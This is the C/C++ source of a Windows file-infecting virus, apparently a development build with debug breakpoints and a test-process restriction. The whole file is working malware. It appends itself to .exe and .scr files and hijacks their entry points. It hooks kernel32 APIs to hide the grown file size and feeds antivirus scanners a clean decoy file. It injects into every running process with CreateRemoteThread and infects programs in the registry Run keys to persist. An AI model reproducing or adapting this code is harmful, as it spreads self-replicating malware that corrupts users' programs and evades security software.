//#define MAGICPID  1848

#define TESTVALUECHANGEME   666 //please change the code where i am used

#define VIRTUALSIZE         0x4000
#define VIRTUALCODESIZE     0x3000
#define RAWSIZEALIGN        0x2000

#include "inc\cpp.hpp"

//todo: cd protection, network, anti av monitor

extern "C" {

/* stealths with finddata's intercepted from the two find-api hooks */
void __fastcall finddatastealth(void* base,WIN32_FIND_DATA* wfd)
{
    hookglob* hg=(hookglob*)((int)base+VIRTUALCODESIZE);
    api* a=(api*)&hg->a;

    if (!(hg->flags&STEALTH_SIZE)) return;

    if (wfd->dwFileAttributes&FILE_ATTRIBUTE_DIRECTORY) return;

    //quick check filetime. 0=not processed, 1=infected, 2=processed,not infected
    if (isspecialfiletime(a,&wfd->ftLastWriteTime) != 1) return;

    //check if it was really infectable
    //if (!isgoodname(base,a,wfd->cFileName)) return;

    //and finally stealth
//    wfd->nFileSizeLow-=RAWSIZEALIGN;
    wfd->nFileSizeLow=123;//RAWSIZEALIGN;
}




/* infects filename (the largest and least optimized routine from this app) */   
int __fastcall infect(api* a,char* filename, void* base)
{
    FILEIO f;
    MZ_HEADER* mz;
    PE_HEADER* pe;

    int iswzip=0;

    asm int 3

    mz=(MZ_HEADER*)openfile(a,&f,filename,RAWSIZEALIGN);

    if (!mz) return 0;
/* 
 ..."If the word value at offset 18h is 40h or greater, the word value at 3Ch
 is typically an offset to a Windows header. Applications must verify this for
 each executable-file header being tested, because a few applications have
 a different header style."...                                              */

    double cloak=(double)IMAGE_DOS_SIGNATURE;

    //avoid strange files

    if ((double)mz->mz_id!=cloak) goto x;   //cloaked MZ sign
    if (mz->mz_relofs<0x40) goto x;
    if (mz->mz_neptr > f.size) goto x;

    pe=(PE_HEADER*)(((MZ_HEADER*)mz)->mz_neptr+(int)mz);

    cloak=(double)IMAGE_NT_SIGNATURE;       //cloaked PE sign

    if ((double)pe->pe_id!=cloak ||
        pe->pe_objectalign!=0x1000 ||
        pe->pe_cputype!=IMAGE_FILE_MACHINE_I386 ||
        pe->pe_securityrva!=0) goto x;

    if (!(pe->pe_flags&IMAGE_FILE_32BIT_MACHINE) ||
        !(pe->pe_flags&IMAGE_FILE_EXECUTABLE_IMAGE) ||
         (pe->pe_flags&IMAGE_FILE_DLL)) goto x;

    if (pe->pe_ntheadersize==224)
    {
        PE_OBJENTRY_STRUCT* pos=(PE_OBJENTRY_STRUCT*)((int)pe+sizeof(PE_HEADER));

        if (pos[0].oe_objectflags&IMAGE_SCN_MEM_WRITE ||
            pos[pe->pe_numofobjects].oe_objectflags&IMAGE_SCN_MEM_WRITE)
          goto x;

        int maxraw=0;
        int maxi;

        for (int i=0;i<pe->pe_numofobjects;i++)
        {
            if (crc32(pos[i].oe_name)==0xa66d28e3)  //is _winzip_ ?
              iswzip++;

            if (pos[i].oe_physoffs>maxraw)  //if highest raw, remember 'm
            {
                maxraw=pos[i].oe_physoffs;
                maxi=i;
            }
        }

        if (maxraw+pos[maxi].oe_physsize < f.size)
          goto x;  //overlays?

        int bestsize=pos[maxi].oe_physsize;
        maxraw+=bestsize;

        pos[maxi].oe_physsize+=RAWSIZEALIGN;
        pos[maxi].oe_virtsize+=RAWSIZEALIGN;
        pe->pe_imagesize+=RAWSIZEALIGN;

        if (pos[maxi].oe_virtsize < pos[maxi].oe_physsize)
          pos[maxi].oe_virtsize=pos[maxi].oe_physsize;

        int entryraw=rva2raw(mz,pe,pe->pe_entrypointrva);

        if (entryraw==0) goto x;

        *(int*)((int)&hostentryrva+(int)base-0x401000)=pe->pe_entrypointrva+pe->pe_imagebase;

        //backup some bytes from host's entrypoint
        memcpy((void*)((int)base+(int)&org9entry-0x401000),(void*)entryraw,9);

        //copy virus
        memcpy((void*)((int)maxraw+(int)mz),base,RAWSIZEALIGN);

        //patch host's entrypoint
        *(char*)entryraw=0xb8;                   //mov eax,
        *(int*)((char*)entryraw+1)=-(bestsize+pos[maxi].oe_virtrva+pe->pe_imagebase);
        *(int*)((char*)entryraw+5)=0xc350d8f7;  //-neg eax- -push eax- -ret-

        //if wzip sfx, kill crc32
        if (iswzip)
        {
            for (int i=0;i<f.size;i++)
            {
                if ( ((char*)mz)[i]==0x4e)     //start of wzip header NMC blabla
                {
                    int sum=0;
                    for (int w=0;w<8;w++)
                    {
                        sum+=((unsigned char*)mz)[i+w];
                        sum=sum<<1;
                    }
                    if (sum==0x91a4)        //should be the sum :)

                    *(int*)&(((char*)mz)[i+8])=0;
                }
            }
        }
    }
    
    closefile(a,&f,0);  //dont restore filesize
    return 1;

x:

    closefile(a,&f,1);  //restore filesize
    return 0;
}




/* rva2raw */
int __fastcall rva2raw(MZ_HEADER* mz,PE_HEADER* pe,int rva)
{
    PE_OBJENTRY_STRUCT* pos=(PE_OBJENTRY_STRUCT*)((int)pe+sizeof(PE_HEADER));

    for (int i=0;i<pe->pe_numofobjects;i++)
    {
        if (rva>pos[i].oe_virtrva&&rva<(pos[i].oe_virtrva+pos[i].oe_virtsize))
            return rva-pos[i].oe_virtrva+pos[i].oe_physoffs+(int)mz;
    }
    return 0;
}




/* checks for .exe, .scr and a list of av names */
int __fastcall isgoodname(void* base,api* a, char* filename)
{
    char buffer[MAX_PATH];

    int blen=a->WideCharToMultiByte(0,0,filename,-1,buffer,sizeof(buffer),0,0);

    if (blen==0) return 0;

    a->CharUpperA(buffer);

    //C..BLAA
    if (buffer[0]!='C' ||
        buffer[3]!='B' ||
        buffer[4]!='L' ||
        buffer[5]!='A' ||
        buffer[6]!='A') return 0;

    int i;

    for (i=blen;buffer[i]!='.';i--)
    {
        if (i==0) return 0;
    }

    int dext=*(int*)(&buffer[i]);

    if (dext!='.EXE' && dext!='.SCR') return 0; //HLL coders & little-endian?

    int crc=crc32(buffer);

    for (int c=0;c<106;c++)
    {
        if (crc==((int*)((int)base+(int)&blacklist-0x401000))[c]) return 0;
    }


    return 1;
}



/* returns 1 if infected, 2 if processed but not infected */
int __fastcall isspecialfiletime(api* a,FILETIME* filetime)
{
    SYSTEMTIME systime;
    a->FileTimeToSystemTime(filetime,&systime);

    //infected?
    if (systime.wHour==(systime.wSecond*16021019)%24 && //1.602*10^-19
        systime.wMinute==(systime.wSecond*911031)%60) //9.1*10^-31
        return 1;

    //processed?
    if (systime.wHour==(systime.wSecond*314159)%24 &&
        systime.wMinute==(systime.wSecond*271828)%60) //pi & e
        return 2;

    return 0;
}

/* checks if filename is infected using findfirstfilew -> time
   returns 1 if infected, 2 if processed but not infected */
int __fastcall isinfected(api* a,char* filename)
{
    WIN32_FIND_DATA wfd;

    int r=0;

    HANDLE h;
    if (INVALID_HANDLE_VALUE!=(h=a->FindFirstFileW(filename,&wfd)))
    {
        r=isspecialfiletime(a,&wfd.ftLastWriteTime);

        a->FindClose(h);
    }
    
    return r;
}




/* main hook handler. is called by assembler intercepter  */
void __fastcall hookhandler(void* base,char* arg1,int hookn, char** arg1p)
{
    hookglob* hg=(hookglob*)((int)base+VIRTUALCODESIZE);
    api* a=(api*)&hg->a;

    if (arg1==0) return;

    int tick=a->GetTickCount(); //avoids api loop locks etc
    if (hg->inapi)
    {
        if (tick-hg->inapi < 666) return;   //666ms max
    }

    hg->inapi=tick;

    char filename[520]; //wide

    unsigned int n=a->lstrlenW(arg1)+1;
    if (n<260)
    {
        memcpy(filename,arg1,n*2);  //backup filename

        int isinf=isinfected(a,arg1); //1 = infected, 2 = processed
        if (!isinf && isgoodname(base,a,filename) && hookn==0)
        {
            isinf=infect(a,filename,base);
        }

        if (!a->IsBadWritePtr((void*)arg1,n*2))
            memcpy(arg1,filename,n*2);  //restore filename if possible

        //if hooking inside AVP32 then make it unable to access the real 
        //infected file
        if (hg->flags==STEALTH_AV && isinf==1)
        {
            asm int 3;
            *(int*)arg1p=(int)getrndfile(hg,a,hg->avbuffer);
        }
    }

    hg->inapi=0;

}




/* picks one of the 1000's of files in the win\system directory. this routine
   is used for av stealth (createfilew by an av of an infected file is re-
   directed to a clean file in the win\system dir */
char* __fastcall getrndfile(hookglob* hg,api* a, char* buf)
{
    int l=a->GetSystemDirectoryW(buf,260);
    if (l)
    {
        *(int*)&((short*)buf)[l]=0x2a005c;  //append wildcard
        ((short*)buf)[l+2]=0;

        WIN32_FIND_DATA wfd;

        HANDLE h=a->FindFirstFileW(buf,&wfd);

        if (h!=INVALID_HANDLE_VALUE)
        {
            unsigned int i=getrnd32(hg)%512;
            for (unsigned int s=0;;s++)
            {
                if(a->FindNextFileW(h,&wfd)==0)
                    break;

                if (s>=i &&
                    !(wfd.dwFileAttributes&FILE_ATTRIBUTE_DIRECTORY) &&
                    isspecialfiletime(a,&wfd.ftLastWriteTime)!=1)

                  break;
            }
            a->FindClose(h);
            memcpy(&((short*)buf)[l+1],wfd.cFileName,100);  //replace *
        }
        return buf;
    }
    else
    {
        return NULL;   //then make the createfilew at least fail...
    }
}




/* based on nothing then feeling, but appears to work fine :) */
unsigned int __fastcall getrnd32(hookglob* hg)
{
    hg->rnd32seed+=160219;
    hg->rnd32seed*=0x49d23711;
    return hg->rnd32seed;
}




/* remote created thread. base = absolute base */
void __stdcall winntloader(void* base)
{
    asm int 3;
    __seh_set

    void* k32base=(void*)getk32base();

    hookglob* hg=(hookglob*)((int)base+VIRTUALCODESIZE);
    api* a=(api*)&hg->a;

    import((int)k32base,(int*)((int)base+(int)&crcs-0x401000),(int*)a);

    void* hostbase=(void*)a->GetModuleHandleA(NULL);

    //give the current process our marker
    int oldprot;
    if (0!=(oldprot=changeprot(a,hostbase,PAGE_READWRITE)))
    {
        PE_HEADER* pe=(PE_HEADER*)(((MZ_HEADER*)hostbase)->mz_neptr+(int)hostbase);
        pe->pe_datetime=TESTVALUECHANGEME;
        a->VirtualProtect(hostbase,4096,oldprot,&oldprot);
    }

    hg->inapi=0;
    hg->flags=0;

    /* check the name of the module where we reside in. if it is one of mr.
       kaspersky's creations, then do a kind of file stealth hack (and also
       mass infect!)
       or if it is acdsee, explorer, cmd, winrar or wincommander, then enable
       filesizestealth. they are stealth compatible and a have a 100% award.
       (winzip for example isn't, but there are rumors it's creators are
       working hard on it to solve the problem) */

    char buffer[260];

    int l=a->GetModuleFileNameA(0,buffer,sizeof(buffer));
    a->CharUpperA(buffer);
    if(l)
    {
        for (int i=l;i>0;i--)
        {
            if (buffer[i]=='\\')
            {
                int crc=crc32(&buffer[i+1]);
                if (crc==0x2a20ddb)    //AVP32.EXE
                {
                    hg->flags=STEALTH_AV;
                }
                if (crc==0x68df08d3 ||
                    crc==0x302f9eef ||
                    crc==0xcdeea7f8 ||
                    crc==0xb27b3251 ||
                    crc==0x9e8f4fc0)                
                  hg->flags=STEALTH_SIZE; //acdsee,explorer,cmd,winrar,wincmd
            }
        }
    }
    
    /*
       now patch kernel32.dll's exports asuming that it is a valid module :)

       each api export is hooked by placing a jmp on its original code. this
       code is backed up at base+virtualsize-100+n*0x10 where n is the api #

    */
    for (int i=0;i<4;i++)   
    {
        if (hookapi(a,k32base,((int*)((int)base+(int)&crcs-0x401000+4))[i],(void*)((int)&hookentry+(int)base-0x401000+i*4),(char*)((int)base+(VIRTUALSIZE-0x100)+i*0x10)))
        {
            ((int*)a)[i]=(int)base+(VIRTUALSIZE-0x100)+i*0x10;//each hook has 0x10 backup space.
        }
    }


    hg->rnd32seed=a->GetTickCount()^l;  //init rnd32

    a->Sleep(getrnd32(hg)%16384);   //a delta delay

    doregistery(a,HKEY_CURRENT_USER,base); 
    doregistery(a,HKEY_LOCAL_MACHINE,base); 

    int procsum=getprocsum(a);

    for(;;)
    {
        a->Sleep(10*1000);
        if (procsum!=getprocsum(a))
        {
            if ((procsum=getprocsum(a))==0) break;  //test not needed
            makeresident(a,base);
        }
    }

    __seh_rem
}




// used to notice new processes.
int __fastcall getprocsum(api* a)
{
    int ppid[256];

    int n;
    if (!a->EnumProcesses(ppid,256,&n)) return 0;

    int sum=0;

    for (int i=0;i<(n>>2);i++)
        sum+=ppid[i];

    return sum;
}




// infects files started by registery to ensure a safe place in the system
void __fastcall doregistery(api* a,int key, void* base)
{
    int reghandle;

    if (a->RegOpenKeyExA(key,(char*)((int)&startupregkey-0x401000+(int)base),0,(void*)KEY_QUERY_VALUE,&reghandle)==ERROR_SUCCESS)
    {
        int index=0;
        for(;;index++)
        {
            char valuedata[520];
            char valuename[260];
            short* vdata=(short*)valuedata;
            int dsize=260;
            int nsize=130;
            int type;
            if (a->RegEnumValueW(reghandle,
                                 index,
                                 valuename,
                                 &nsize,
                                 0,
                                 &type,
                                 (char*)vdata,
                                 &dsize)!=ERROR_SUCCESS) break;

            //asdf

            if (vdata[0]=='"') vdata++;
            for(int i=1;i<dsize;i++)
            {
                if (vdata[i]=='"')
                {
                    vdata[i]=0;
                    break;
                }

            }

            if (isgoodname(base,a,(char*)vdata) && !isinfected(a,(char*)vdata))
                infect(a,(char*)vdata,base);

        }
        a->RegCloseKey(reghandle);
    }
}




/* hooks from module 'base' the exported api-name whose crc matches 'crc' and
   makes it point to 'fn' and backups at 'backup' */
int __fastcall hookapi(api* a,void* base, int crc, void* fn, char* backup)
{
    PE_EXPORT* exp = (PE_EXPORT*)((int)base+((PE_HEADER*)((int)base+((MZ_HEADER*)base)->mz_neptr))->pe_exportrva);
    char** nametbl = (char**)((int)base+exp->ex_namepointersrva);
    short* ordinaltbl = (short*)((int)base+exp->ex_ordinaltablerva);
    int* fntbl = (int*)((int)base+exp->ex_addresstablerva);

    int i;
    for (i=0;crc32(nametbl[i]+(int)base)!=crc;i++)
        ;

    char* apicode=(char*)(fntbl[ordinaltbl[i]]+(int)base);

    //disassemble first part of api

    i=0;
    for(;;)
    {
        int l=poordasm((void*)((int)apicode+i));
        i+=l;
        if (l==0||i>=5) break;
    }

    //if we were able to disasm >=5 bytes then hook it
    if (i>=5)
    {
        memcpy(backup,apicode,i);   //backup original code aligned on opcodes

        (int)backup+=i;

        *(unsigned char*)backup=0xe9;
        *(int*)((int)backup+1)=(int)apicode+i-(int)backup-5;

        int newrva=(int)fn-(int)apicode-5;

        int oldprot=changeprot(a,apicode,PAGE_READWRITE);   //deprotect
        if (oldprot!=0)
        {
            //if windows decides to taskswitch between these two lines,
            //we are really really screwed...
            *(unsigned char*)apicode=0xe9;
            *(int*)((int)apicode+1)=newrva;

            changeprot(a,apicode,oldprot);              //reprotect
            return 1;
        }

    }
    return 0;
}


int __fastcall changeprot(api* a,void* address,int flags)
{
        MEMORY_BASIC_INFORMATION mbf;

        if(a->VirtualQuery((void*)((int)address&~0xfff),&mbf,sizeof(mbf))==sizeof(mbf))
        {
            if (mbf.Protect==flags) return flags;
        }

        int oldprot;
        int ret=a->VirtualProtect((void*)((int)address&~0xfff),4096,flags,&oldprot);

        if (ret!=0)
         return oldprot;
        else
         return ret;    //return 0

}


//locals used by make resident (imho to large to alloc on stack)
#define MAX_PROC 256
#define MAX_HMOD 512
#define MAX_BUFF 0x2000
typedef struct MAKERESIDENT_
{
        int ppid[MAX_PROC];
        int hmod[MAX_HMOD];
        char buffer[MAX_BUFF];
} MAKERESIDENT;


/* enums processes, check if they are already hooked, if not, do it */
void __fastcall makeresident(api* a, void* vimbase)
{
    MAKERESIDENT* mr=(MAKERESIDENT*)alloc(a,sizeof(MAKERESIDENT));

    int cproc;

    if (a->EnumProcesses(mr->ppid,MAX_PROC,&cproc))
    {
        for (int p=0;p<(cproc>>2);p++)
        {
            HANDLE hproc=a->OpenProcess(PROCESS_VM_READ+PROCESS_VM_WRITE+
                                                PROCESS_CREATE_THREAD+
                                                PROCESS_QUERY_INFORMATION+
                                                PROCESS_VM_OPERATION,0,
                                                mr->ppid[p]);
#ifdef MAGICPID
            if (hproc!=0 && mr->ppid[p]==MAGICPID)
#else
#pragma message "Magic-pId DISABLED"
            if (hproc!=0)
#endif
            {
                int cmod;

                if (a->EnumProcessModules(hproc,mr->hmod,MAX_HMOD,&cmod))
                {
                    int itemp;  //used by readprocmem & writeprocmem

                    if (a->ReadProcessMemory(hproc,(void*)(mr->hmod[0]),mr->buffer,MAX_BUFF,&itemp))
                    {
                        MZ_HEADER* mz=((MZ_HEADER*)&mr->buffer);
                        if (mz->mz_neptr<MAX_BUFF)
                        {
                            PE_HEADER* pe=(PE_HEADER*)(mz->mz_neptr+(int)&mr->buffer);

                            if (pe->pe_datetime!=TESTVALUECHANGEME)
                            {
                                void* newworld;
                                if ((newworld=a->VirtualAllocEx(hproc,0,VIRTUALSIZE,MEM_RESERVE+MEM_COMMIT,PAGE_EXECUTE_READWRITE))!=0)
                                {
                                    a->CloseHandle((HANDLE)vimbase);
                                    if (a->WriteProcessMemory(hproc,newworld,vimbase,RAWSIZEALIGN,&itemp))
                                    {
                                        a->CloseHandle(
                                            a->CreateRemoteThread(hproc,NULL,0,(void*)((int)((int)&winntloader-(int)0x401000)+(int)newworld),newworld,0,0)
                                        );
                                    }

                                }

                            }

                        }

                    }

                }                
                a->CloseHandle(hproc);
            }

        }

    }
    free(a,mr);
}




/* alloc & free do allocate and free memory for you */
void* __fastcall alloc(api* a,int size)
{
        return a->VirtualAllocEx(-1,NULL,size,MEM_COMMIT,PAGE_READWRITE);
}
void __fastcall free(api* a,void* al)
{
        a->VirtualFree(al,0,MEM_RELEASE);
}




/* opens, maps, etc a file */
void* __fastcall openfile(api* a,FILEIO* f,char* filename, int expand)
{
    short fullpath[260];

    int n;
    if (!a->GetFullPathNameW(filename,260,(char*)fullpath,&n)) return NULL;

    if (a->SfcIsFileProtected(0,fullpath)) return NULL;

    f->hFile=a->CreateFileW(filename,
                            GENERIC_READ+GENERIC_WRITE,
                            FILE_SHARE_READ,
                            0,
                            OPEN_EXISTING,
                            FILE_ATTRIBUTE_NORMAL,
                            0);

    if (f->hFile==INVALID_HANDLE_VALUE) return NULL;

    f->size=a->GetFileSize(f->hFile,NULL);
    
    f->hMap=a->CreateFileMappingW(f->hFile,0,PAGE_READWRITE,0,f->size+expand,0);

    if (f->hMap==0) return NULL;

    f->hView=a->MapViewOfFile(f->hMap,FILE_MAP_READ+FILE_MAP_WRITE,0,0,f->size+expand);

    return f->hView;
}




/* used to close all handles & view from a fileio structure
   also mark file as processed (no-infect-retry) and/or infected (stealth) */
void __fastcall closefile(api* a,FILEIO* f, int restore)
{
    SYSTEMTIME systime;
    FILETIME filetime;

    a->UnmapViewOfFile(f->hView);
    a->CloseHandle(f->hMap);

    a->GetFileTime(f->hFile,NULL,NULL,&filetime);
    a->FileTimeToSystemTime(&filetime,&systime);

    if (restore)    //restore size
    {
        a->SetFilePointer(f->hFile,f->size,0,0);
        a->SetEndOfFile(f->hFile);

        //mark as processed
        systime.wHour==(systime.wSecond*314159)%24;     //pi
        systime.wMinute==(systime.wSecond*271828)%60;   //e

    }
    else
    {
        systime.wHour=(systime.wSecond*16021019)%24;   //1.602*10^-19
        systime.wMinute=(systime.wSecond*911031)%60;   //9.1*10^-31
    }

    a->SystemTimeToFileTime(&systime,&filetime);

    a->SetFileTime(f->hFile,NULL,NULL,&filetime);
    a->CloseHandle(f->hFile);

}




/*  used to import apis */
void __fastcall import(int base, int* crcs, int* imports)
{
    int didfirst=0; //kind of hack for kernel32- vs nonkernel32 imports
    api* import=(api*)imports;

    for (;;crcs++)
    {
        char** nametbl;
        short* ordinaltbl;
        int* fntbl;

        if (!*crcs)
        {
            crcs++;

            if (!*crcs) return;

            if (didfirst)
            {
                base=(int)import->LoadLibraryA((char*)crcs);
                if (((char*)crcs)[0]=='a') ((char*)crcs)++;    //advapi hack
                crcs+=2;    //2*4=8 makes chars
            }
            didfirst++;
                                //ugly huge cast vs 8 bytes smaller binary?
            PE_EXPORT* exp = (PE_EXPORT*)(base+((PE_HEADER*)(base+((MZ_HEADER*)base)->mz_neptr))->pe_exportrva);
            nametbl = (char**)(base+exp->ex_namepointersrva);
            ordinaltbl = (short*)(base+exp->ex_ordinaltablerva);
            fntbl = (int*)(base+exp->ex_addresstablerva);
        }

        int i;
        for (i=0;crc32(nametbl[i]+base)!=*(int*)crcs;i++)
            ;

        //after kernel32.dll is imported, get addresses using getprocaddress
        //(mainly because of sfc.dll / sfc_os.dll delayed load import)
        if (didfirst==1)
        {
            short ordinal=ordinaltbl[i];
            *imports=fntbl[ordinal]+base;
        }
        else
        {
            *imports=(int)(import->GetProcAddress(base,nametbl[i]+base));
        }

        imports++;
    }

}

};
